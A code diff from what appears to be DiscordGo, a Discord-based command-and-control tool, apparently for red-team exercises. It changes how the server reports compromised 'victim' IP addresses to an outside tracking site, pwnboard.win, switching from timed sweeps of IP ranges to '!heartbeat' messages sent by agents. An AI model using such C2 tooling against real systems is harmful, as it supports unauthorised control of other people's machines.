@@ -10,7 +10,6 @@ import (
 	"os/signal"
 	"strings"
 	"syscall"
-	"time"
 
 	"github.com/emmaunel/DiscordGo/pkg/util/constants"
 
@@ -101,18 +100,6 @@ func main() {
 	}
 	cleanChannels(dg)
 
-	go func() {
-		ticker := time.NewTicker(time.Second * 15)
-		for {
-			<-ticker.C
-			go updatepwnBoard("172.16", "30")
-			go updatepwnBoard("172.16", "40")
-			go updatepwnBoard("10", "1.40")
-			go updatepwnBoard("10", "1.50")
-			go updatepwnBoard("10", "1.60")
-		}
-	}()
-
 	dg.AddHandler(guimessageCreater)
 
 	// Open a websocket connection to Discord and begin listening.
@@ -124,7 +111,7 @@ func main() {
 
 	// Wait here until CTRL-C or other term signal is received.
 	sc := make(chan os.Signal, 1)
-	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
 	<-sc
 
 	// Delete a channel
@@ -138,37 +125,37 @@ func main() {
 // updatepwnBoard sends a post request to pwnboard with the IP
 // Request is done every 15 seconds
 // ip: Victim's IP
-func updatepwnBoard(start, end string) {
+func updatepwnBoard(ip string) {
 
 	url := "http://pwnboard.win/generic"
 
-	for i := 1; i < 17; i++ {
-
-		ip := fmt.Sprintf("%v.%v.%v", start, i, end)
-		// Create the struct
-		data := PwnBoard{
-			IPs:  ip,
-			Type: "DiscordG0",
-		}
-
-		// Marshal the data
-		sendit, err := json.Marshal(data)
-		if err != nil {
-			return
-		}
-
-		// Send the post to pwnboard
-		resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
-		if err != nil {
-			return
-		}
-
-		defer resp.Body.Close()
+	data := PwnBoard{
+		IPs:  ip,
+		Type: "DiscordG0",
 	}
+
+	// Marshal the data
+	sendit, err := json.Marshal(data)
+	if err != nil {
+		return
+	}
+
+	// Send the post to pwnboard
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
+	if err != nil {
+		return
+	}
+
+	defer resp.Body.Close()
 
 }
 
 func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
+	if strings.HasPrefix(message.Content, "!heartbeat") {
+		agent_ip_address := strings.Split(message.Content, " ")[1]
+		updatepwnBoard(agent_ip_address)
+	}
+
 	if message.Author.ID == dg.State.User.ID {
 		return
 	}
